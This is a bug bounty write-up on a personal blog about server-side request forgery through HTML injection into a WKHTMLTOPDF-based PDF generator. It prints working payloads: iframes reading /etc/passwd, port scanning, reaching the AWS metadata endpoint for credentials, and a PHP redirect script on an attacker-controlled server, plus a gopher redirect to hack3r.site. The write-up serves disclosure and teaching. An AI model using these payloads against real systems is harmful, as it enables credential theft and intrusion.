<!DOCTYPE html>
<html lang="en-gb"><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
<meta http-equiv="content-type" content="text/html">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title itemprop="name">SSRF Through PDF Generation | Joshua MARTINELLE</title>
<meta property="og:title" content="SSRF Through PDF Generation | Joshua MARTINELLE" />
<meta name="twitter:title" content="SSRF Through PDF Generation | Joshua MARTINELLE" />
<meta itemprop="name" content="SSRF Through PDF Generation | Joshua MARTINELLE" />
<meta name="application-name" content="SSRF Through PDF Generation | Joshua MARTINELLE" />
<meta property="og:site_name" content="Joshua MARTINELLE" />

<meta name="description" content="SSRF Through PDF Generation">
<meta itemprop="description" content="SSRF Through PDF Generation" />
<meta property="og:description" content="SSRF Through PDF Generation" />
<meta name="twitter:description" content="SSRF Through PDF Generation" />

<meta property="og:locale" content="en-gb" />
<meta name="language" content="en-gb" />

  <link rel="alternate" hreflang="en-gb" href="http://localhost:1313/posts/2021/ssrf_through_pdf_generation/" title="" />





    
    
    

    <meta property="og:type" content="article" />
    <meta property="og:article:published_time" content=2021-05-01T12:00:00&#43;0100 />
    <meta property="article:published_time" content=2021-05-01T12:00:00&#43;0100 />
    <meta property="og:url" content="http://localhost:1313/posts/2021/ssrf_through_pdf_generation/" />

    

    

    <script defer type="application/ld+json">
    {
        "@context": "http://schema.org",
        "@type": "Article",
        "headline": "SSRF Through PDF Generation",
        "author": {
        "@type": "Person",
        "name": ""
        },
        "datePublished": "2021-05-01",
        "description": "SSRF Through PDF Generation",
        "wordCount":  807 ,
        "mainEntityOfPage": "True",
        "dateModified": "2021-05-01",
        "image": {
        "@type": "imageObject",
        "url": ""
        },
        "publisher": {
        "@type": "Organization",
        "name": "Joshua MARTINELLE"
        }
    }
    </script>


<meta name="generator" content="Hugo 0.145.0">

    
    <meta property="og:url" content="http://localhost:1313/posts/2021/ssrf_through_pdf_generation/">
  <meta property="og:site_name" content="Joshua MARTINELLE">
  <meta property="og:title" content="SSRF Through PDF Generation">
  <meta property="og:description" content="SSRF Through PDF Generation">
  <meta property="og:locale" content="en_gb">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2021-05-01T12:00:00+01:00">
    <meta property="article:modified_time" content="2021-05-01T12:00:00+01:00">


    
    
  <meta name="twitter:card" content="summary">
  <meta name="twitter:title" content="SSRF Through PDF Generation">
  <meta name="twitter:description" content="SSRF Through PDF Generation">


    

    <link rel="canonical" href="http://localhost:1313/posts/2021/ssrf_through_pdf_generation/">
    <link href="/style.min.2d921c18cf1ec555ffc03d59a8adc211c402c68c930c27d6a0c306ab175a8d09.css" rel="stylesheet">
    <link href="/code-highlight.min.706d31975fec544a864cb7f0d847a73ea55ca1df91bf495fd12a177138d807cf.css" rel="stylesheet">

    
    <link rel="apple-touch-icon" sizes="180x180" href="/icons/apple-touch-icon.png">
    <link rel="icon" type="image/png" sizes="32x32" href="/icons/favicon-32x32.png">
    <link rel="icon" type="image/png" sizes="16x16" href="/icons/favicon-16x16.png">
    <link rel="mask-icon" href="/icons/safari-pinned-tab.svg">
    <link rel="shortcut icon" href="/favicon.ico">




<link rel="manifest" href="http://localhost:1313/site.webmanifest">

<meta name="msapplication-config" content="/browserconfig.xml">
<meta name="msapplication-TileColor" content="#2d89ef">
<meta name="theme-color" content="#434648">

    
    <link rel="icon" type="image/svg+xml" href="/icons/favicon.svg">

    
    
</head>
<body data-theme = "light" class="notransition">

<script src="/js/theme.js"></script>

<div class="navbar" role="navigation">
    <nav
        class="menu"
        aria-label="Main Navigation"
        style="
            display: flex;
            align-items: center;
            justify-content: space-between;
            width: 100%;
            padding: 0 10px;
        "
    >
        <div style="display: flex; align-items: center; gap: 10px">
            <svg viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" stroke="#000000" width="25" height="25" stroke-width="0.304"><g id="SVGRepo_bgCarrier" stroke-width="0"></g><g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round"></g><g id="SVGRepo_iconCarrier"> <path fill-rule="evenodd" clip-rule="evenodd" d="M15 1H1V15H15V1ZM6 5L7.41421 6.41421L5.82843 8L7.41421 9.58579L6 11L3 8L6 5ZM10 5L8.58579 6.41421L10.1716 8L8.58579 9.58579L10 11L13 8L10 5Z" fill="#ffffff"></path> </g></svg>

            <a
                href="/"
                style="font-weight: bold; text-decoration: none; color: inherit"
                >Joshua MARTINELLE</a
            >
        </div>

        <div style="display: flex; align-items: center; margin-right: 2vh">
            <a
                href="https://github.com/JoshuaMART"
                class="logo"
                style="margin-right: 12px; display: block"
            >
                <svg class="mode-sunny" viewBox="0 0 20 20" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" fill="currentColor" width="20" height="20"><g id="SVGRepo_bgCarrier" stroke-width="0"></g><g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round"></g><g id="SVGRepo_iconCarrier"> <title>GITHUB</title> <desc>Created with Sketch.</desc> <defs> </defs> <g id="Page-1" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd"> <g id="Dribbble-Light-Preview" transform="translate(-140.000000, -7559.000000)" fill="currentColor"> <g id="icons" transform="translate(56.000000, 160.000000)"> <path d="M94,7399 C99.523,7399 104,7403.59 104,7409.253 C104,7413.782 101.138,7417.624 97.167,7418.981 C96.66,7419.082 96.48,7418.762 96.48,7418.489 C96.48,7418.151 96.492,7417.047 96.492,7415.675 C96.492,7414.719 96.172,7414.095 95.813,7413.777 C98.04,7413.523 100.38,7412.656 100.38,7408.718 C100.38,7407.598 99.992,7406.684 99.35,7405.966 C99.454,7405.707 99.797,7404.664 99.252,7403.252 C99.252,7403.252 98.414,7402.977 96.505,7404.303 C95.706,7404.076 94.85,7403.962 94,7403.958 C93.15,7403.962 92.295,7404.076 91.497,7404.303 C89.586,7402.977 88.746,7403.252 88.746,7403.252 C88.203,7404.664 88.546,7405.707 88.649,7405.966 C88.01,7406.684 87.619,7407.598 87.619,7408.718 C87.619,7412.646 89.954,7413.526 92.175,7413.785 C91.889,7414.041 91.63,7414.493 91.54,7415.156 C90.97,7415.418 89.522,7415.871 88.63,7414.304 C88.63,7414.304 88.101,7413.319 87.097,7413.247 C87.097,7413.247 86.122,7413.234 87.029,7413.87 C87.029,7413.87 87.684,7414.185 88.139,7415.37 C88.139,7415.37 88.726,7417.2 91.508,7416.58 C91.513,7417.437 91.522,7418.245 91.522,7418.489 C91.522,7418.76 91.338,7419.077 90.839,7418.982 C86.865,7417.627 84,7413.783 84,7409.253 C84,7403.59 88.478,7399 94,7399" id="github-[#142]"> </path> </g> </g> </g> </g></svg>

            </a>

            <a id="mode" href="#" style="display: block">
                <svg xmlns="http://www.w3.org/2000/svg" class="mode-sunny" width="20" height="20" viewBox="0 0 14 14" stroke-width="1">
<title>LIGHT</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></circle><line x1="7" y1="0.5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="0.5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line></g></svg> <svg xmlns="http://www.w3.org/2000/svg" class="mode-moon" width="20" height="20" viewBox="0 0 14 14" stroke-width="1">
<title>DARK</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></circle><line x1="7" y1="0.5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="0.5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line></g></svg>
            </a>
        </div>
    </nav>
</div>

<div class="wrapper post">
    <main class="page-content" aria-label="Content">
        <article>
            <header class="header">
                <h1 class="header-title">SSRF Through PDF Generation</h1>
                
                
                
                <div class="post-meta">
                    <time datetime="2021-05-01T12:00:00&#43;01:00" itemprop="datePublished"> 1 May 2021 </time>
                </div>
                
            </header>
            
            <div class="page-content">
                <p><img src="/posts/2021/ssrf_through_pdf_generation/banner.png" alt=""></p>
<p>This week on a BugBounty program which I left aside I found my first SSRF, here is my writeup.</p>
<h2 id="recon">Recon</h2>
<p>The scope is restricted to the website and its API, rather basic it allows to register as a simple user and has only a few features.</p>
<p>The program has been open for several months already, I approached the site thinking I probably won&rsquo;t find much.</p>
<p>However from the first hours I already had several P2 (IDOR). A scope perhaps more interesting than expected &hellip; so I spent some time to observe the various features and how they work as a simple user.</p>
<p>After some tests I noticed a feature that allows to generate a PDF with data entered by the user, the software used is <em>WKHTMLTOPDF</em> in its version <em>0.12.3</em>.</p>
<p>Interesting, especially since recently I could read the excellent presentation of Nahamsec &ldquo;<a href="https://docs.google.com/presentation/d/1JdIjHHPsFSgLbaJcHmMkE904jmwPM4xdhEuwhy2ebvo/edit#slide=id.g5df2243028_2_81">Owning the cloud through SSRF and PDF generators</a>&rdquo;, if I retained at least 1 thing from this presentation it&rsquo;s the sentence &ldquo;<em>If you see a PDF generator somewhere, 9/10 it&rsquo;s vulnerable</em>&rdquo;.</p>
<p>After some tests I finally didn&rsquo;t manage to exploit the feature, at least not on this endpoint !</p>
<p>While continuing to use the site and its features I came across a page that allowed me to add items and then generate a PDF of them, ok &hellip; let&rsquo;s try again. I first started with a basic payload:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">b</span><span class="p">&gt;</span>TEST<span class="p">&lt;/</span><span class="nt">b</span><span class="p">&gt;</span>
</span></span></code></pre></div><p>Nothing &hellip; try something else :</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">&#34;https://google.fr&#34;</span><span class="p">&gt;</span>xxx<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;</span>
</span></span></code></pre></div><p>This time, it&rsquo;s well reflected in the PDF and the link is clickable, so it&rsquo;s possible to inject HTML!</p>
<h2 id="exploitation">Exploitation</h2>
<p>In the rush I directly wanted to load the contents of the file &ldquo;/etc/passwd&rdquo; with the following payload :</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">iframe</span> <span class="na">src</span><span class="o">=</span><span class="s">&#34;file:///etc/passwd&#34;</span><span class="p">&gt;</span>
</span></span></code></pre></div><p>Unfortunately the iframe was empty, so I tested a first payload to check that it was possible to interact with an external resource.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">iframe</span> <span class="na">src</span><span class="o">=</span><span class="s">&#34;https://{MY_SERVER}/x.png&#34;</span><span class="p">&gt;</span>
</span></span></code></pre></div><p>While generating the PDF, I received the request to my server, which confirmed that it is possible to use an iframe, so I tested various techniques, including port scanning with a payload of the type :</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">iframe</span> <span class="na">src</span><span class="o">=</span><span class="s">&#34;https://domain.tld:80&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">iframe</span> <span class="na">src</span><span class="o">=</span><span class="s">&#34;https://domain.tld:25&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">iframe</span> <span class="na">src</span><span class="o">=</span><span class="s">&#34;https://domain.tld:22&#34;</span><span class="p">&gt;</span>
</span></span></code></pre></div><p>When a port was not available I got a 500 error from the server, ok so I got a blind SSRF but I wanted more than a simple port scan! Then I remembered that at one point in the site when you want to access a document the URL is of the type <em><a href="https://domain.tld/s3/get/document/8/%7BRESSOURCE_ID%7D">https://domain.tld/s3/get/document/8/{RESSOURCE_ID}</a></em>.</p>
<p>Hum. .., <em>S3</em> ? Maybe an AWS instance, let&rsquo;s test that :</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">iframe</span> <span class="na">src</span><span class="o">=</span><span class="s">&#34;http://169.254.169.254&#34;</span><span class="p">&gt;</span>
</span></span></code></pre></div><p>Boom ! I have access to the AWS instance and its content, including credentials (API tokens, etc&hellip;) which are private and sensitive elements.</p>
<p><img src="/posts/2021/ssrf_through_pdf_generation/SSRF_AWS_KEY.png" alt="SSRF_AWS_KEY"></p>
<h2 id="digging">Digging</h2>
<p>Ok cool, this SSRF is already critical, but in the end I wanted to load a local file on the server such as &ldquo;<em>/etc/passwd</em>&rdquo;, after some tests and bypassing technique I always end up with an empty iframe.</p>
<p>Then while talking with a hunter friend, he showed me a very interesting technique, a PHP code snippet that allows to include an iframe to an external URL that will redirect to 127.0.0.1 but with the possibility to include a parameter such as &ldquo;<em>file://</em>&rdquo;&quot; to load a local file.</p>
<p>The code snippet is as follows:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$loc</span> <span class="o">=</span> <span class="s2">&#34;http://127.0.0.1/&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;a&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$loc</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;a&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="nx">header</span><span class="p">(</span><span class="s1">&#39;Location: &#39;</span><span class="o">.</span><span class="nv">$loc</span><span class="p">);</span>
</span></span></code></pre></div><p>So I quickly set it up on my server (You will have understood that it is necessary to have a web server with PHP installed for this piece of code to be usable).</p>
<p>I can now use the following payload:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">iframe</span> <span class="na">src</span><span class="o">=</span><span class="s">&#34;https://my_server.tld/ssrf.php?a=file:///etc/passwd&#34;</span><span class="p">&gt;</span>
</span></span></code></pre></div><p>I generate the new PDF and hop! I have the content of the desired file :D</p>
<h2 id="conclusion">Conclusion</h2>
<p>This SSRF is interesting because even if it may remain quite &ldquo;simple&rdquo;, it shows that you should not stop at the first payload that works (the port scan in my case) and try to dig for the most critical scenario.</p>
<p>In the end, by looking closer, on the Github repository of <a href="https://github.com/swisskyrepo/PayloadsAllTheThings">PayloadAllTheThings</a> it is possible to find the following payload:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl">  <span class="nx">header</span><span class="p">(</span><span class="s2">&#34;Location: gopher://hack3r.site:1337/_SSRF%0ATest!&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></div><p>That you only have to modify in this to get the same result as above:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"> <span class="nx">header</span><span class="p">(</span><span class="s2">&#34;Location: file:///etc/passwd&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></div><p>The advantage of the code snippet above is that it is possible to directly include the wrapper with the desired payload as a parameter rather than modifying the content of the php file each time.</p>
<p>Initially I hadn&rsquo;t watched this program because I didn&rsquo;t find it interesting, it&rsquo;s only several months after I decided to have a look at it, although several hunters have raised vulnerabilities I learned here that it&rsquo;s always interesting to go back to an &ldquo;old scope&rdquo;.</p>
<p>That doesn&rsquo;t mean the other hunters were bad because each hunter has its own methodology and favorite vulnerabilities, especially since this is a production site so there is a strong chance that there have been changes or new features that weren&rsquo;t available before.</p>

            </div>
        </article></main>
</div>
<footer class="footer">
    <span class="footer_item"> </span>
    &nbsp;

    <div class="footer_social-icons">
</div>
    <small class="footer_copyright">
        © 2025 .
        Powered by <a href="https://github.com/hugo-sid/hugo-blog-awesome" target="_blank" rel="noopener">Hugo blog awesome</a>.
    </small>
</footer><a href="#" title="Go to top" id="totop">
    <svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" fill="currentColor" stroke="currentColor" viewBox="0 96 960 960">
    <path d="M283 704.739 234.261 656 480 410.261 725.739 656 677 704.739l-197-197-197 197Z"/>
</svg>

</a>


    






    
    <script async src="http://localhost:1313/js/main.js" ></script>

    

</body>
</html>
